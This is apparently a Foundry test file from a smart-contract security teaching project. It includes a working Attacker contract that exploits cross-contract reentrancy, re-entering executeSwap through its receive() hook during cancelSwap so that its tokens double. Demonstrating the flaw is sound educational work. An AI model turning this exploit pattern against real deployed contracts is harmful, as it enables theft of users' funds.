//SPDX-License_Identifier: GPL-3.0

import {CrossContractManager, CrossContractExecutor} from "../../src/Reentrancy/CrossContract.sol";
import {Test, console} from "lib/forge-std/src/Test.sol";
import {MyToken} from "../../src/Reentrancy/utils/MyToken.sol";

pragma solidity ^0.8.18;

contract CrossContractTest is Test {
    CrossContractManager victimContract1;
    CrossContractExecutor victimContract2;
    MyToken myToken;
    Attacker attacker;
    address victim1 = makeAddr("victim1");
    uint256 amount = 2;

    function setUp() public {
        myToken = new MyToken();
        victimContract1 = new CrossContractManager(address(myToken));
        victimContract2 = new CrossContractExecutor(address(victimContract1));
        attacker = new Attacker(address(victimContract1), address(victimContract2));
    }

    function test_crossContract() public {
        vm.prank(victim1);
        CrossContractManager(victimContract1).createSwap(amount);
        assert(myToken.balanceOf(address(victimContract1)) == 98);
        assert(myToken.balanceOf(address(victim1)) == 2);
        vm.prank(address(attacker));
        attacker.attack(amount);
        assert(myToken.balanceOf(address(victimContract1)) == 94);
        assert(myToken.balanceOf(address(attacker)) == 4); // attacker duplicated his amount
    }
}

contract Attacker {
    address victimContract1;
    address victimContract2;
    uint256 nonce;

    constructor(address _victimContract1, address _victimContract2) {
        victimContract1 = _victimContract1;
        victimContract2 = _victimContract2;
    }

    function attack(uint256 amount) external {
        nonce = CrossContractManager(victimContract1).getNonce() +1 ;
        CrossContractManager(victimContract1).createSwap(amount);
        CrossContractManager(victimContract1).cancelSwap(nonce); //transfer 2 executed
    }

    receive() external payable {
        CrossContractExecutor(victimContract2).executeSwap(nonce); //transfer 1 executed
    }
}
